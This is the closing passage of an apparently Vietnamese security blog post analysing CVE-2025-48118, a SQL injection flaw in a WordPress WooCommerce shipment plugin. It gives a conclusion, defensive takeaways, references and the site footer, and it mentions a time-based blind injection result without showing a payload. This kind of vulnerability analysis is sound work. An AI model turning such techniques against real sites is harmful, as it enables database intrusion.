<p>👉 Dựa trên thời gian phản hồi =&gt; kí tự đầu tiên đúng là <code>w</code>.</p>
<hr>
<h2 id="conclusion">Conclusion</h2>
<p>Lỗ hổng <strong>CVE-2025-48118</strong> trong plugin WordPress <strong>Woocommerce Partial Shipment</strong> trước phiên bản <strong>3.3</strong>, xuất phát từ việc truyền trực tiếp input từ người dùng vào SQL query mà không có biện pháp kiểm soát chặt chẽ dẫn đến lỗ hổng SQL Injection.</p>
<p>Chưa có bản vá chính thực nào cho lỗ hổng này.</p>
<p><strong>Key takeaways</strong>:</p>
<ul>
<li>Kiểm soát kỹ input từ người dùng.</li>
<li>Luôn sử dụng <code>$wpdb-&gt;prepare()</code> khi làm việc với database trong WordPress để tránh SQL Injection.</li>
<li>Thường xuyên cập nhật plugin và kiểm tra bảo mật để tránh trở thành mục tiêu tấn công.</li>
</ul>
<hr>
<h2 id="references">References</h2>
<p><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet" target="_blank" rel="noopener noreffer ">SQL Injection cheat sheet - PortSwigger</a></p>
<p><a href="https://patchstack.com/database/wordpress/plugin/wc-partial-shipment/vulnerability/wordpress-woocommerce-partial-shipment-3-2-sql-injection-vulnerability" target="_blank" rel="noopener noreffer ">WordPress Woocommerce Partial Shipment Plugin &lt;= 3.2 is vulnerable to SQL Injection</a></p>
<hr>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Cập nhật ngày 2025-09-29</span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"><span>
                            <a class="link-to-markdown" href="/vi/2025-09-29-cve-2025-48118/index.md" target="_blank">Đọc với định dạng Markdown</a>
                        </span></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="Chia sẻ trên X" data-sharer="x" data-url="http://localhost:1313/vi/2025-09-29-cve-2025-48118/" data-title="CVE-2025-48118 Analysis &amp; POC" data-hashtags="analyst,plugin,sqli"><i class="fab fa-x-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Chia sẻ trên Threads" data-sharer="threads" data-url="http://localhost:1313/vi/2025-09-29-cve-2025-48118/" data-title="CVE-2025-48118 Analysis &amp; POC"><i class="fab fa-threads fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Chia sẻ trên Facebook" data-sharer="facebook" data-url="http://localhost:1313/vi/2025-09-29-cve-2025-48118/" data-hashtag="analyst"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Chia sẻ trên Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/vi/2025-09-29-cve-2025-48118/" data-title="CVE-2025-48118 Analysis &amp; POC"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Chia sẻ trên Line" data-sharer="line" data-url="http://localhost:1313/vi/2025-09-29-cve-2025-48118/" data-title="CVE-2025-48118 Analysis &amp; POC"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Chia sẻ trên 微博" data-sharer="weibo" data-url="http://localhost:1313/vi/2025-09-29-cve-2025-48118/" data-title="CVE-2025-48118 Analysis &amp; POC" data-image="app.png"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Chia sẻ trên Diaspora" data-sharer="diaspora" data-url="http://localhost:1313/vi/2025-09-29-cve-2025-48118/" data-title="CVE-2025-48118 Analysis &amp; POC" data-description="Security Vulnerability in WordPress Woocommerce Partial Shipment Plugin."><i class="fab fa-diaspora fa-fw" aria-hidden="true"></i></a><a href="https://t.me/share/url?url=http%3a%2f%2flocalhost%3a1313%2fvi%2f2025-09-29-cve-2025-48118%2f&amp;text=CVE-2025-48118%20Analysis%20%26%20POC" target="_blank" title="Chia sẻ trên Telegram"><i class="fab fa-telegram fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/vi/tags/analyst/">Analyst</a>,&nbsp;<a href="/vi/tags/plugin/">Plugin</a>,&nbsp;<a href="/vi/tags/sqli/">Sqli</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Quay lại</a></span>&nbsp;|&nbsp;<span><a href="/vi/">Trang chủ</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/vi/2025-09-28-cve-2025-30936/" class="prev" rel="prev" title="CVE-2025-30936 Analysis &amp; POC"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>CVE-2025-30936 Analysis & POC</a>
            <a href="/vi/2025-09-30-cve-2025-2011/" class="next" rel="next" title="CVE-2025-2011 Analysis &amp; POC">CVE-2025-2011 Analysis & POC<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://w41bu1.github.io" target="_blank">w41bu1</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Lên trên">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a>
        </div>

        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="Xem bình luận">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><script src="/lib/autocomplete/autocomplete.min.js"></script><script src="/lib/algoliasearch/lite/browser.umd.js"></script><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/lightgallery/lightgallery.min.js"></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script>window.config={"comment":{},"lightgallery":true,"search":{"algoliaAppID":"GZT24PWKNT","algoliaIndex":"index","algoliaSearchKey":"634ab679e825b815de2663de38908f9d","highlightTag":"em","maxResultLength":10,"noResultsFound":"Không tìm thấy","snippetLength":50,"type":"algolia"}};</script><script src="/js/theme.min.js"></script></body>
</html>
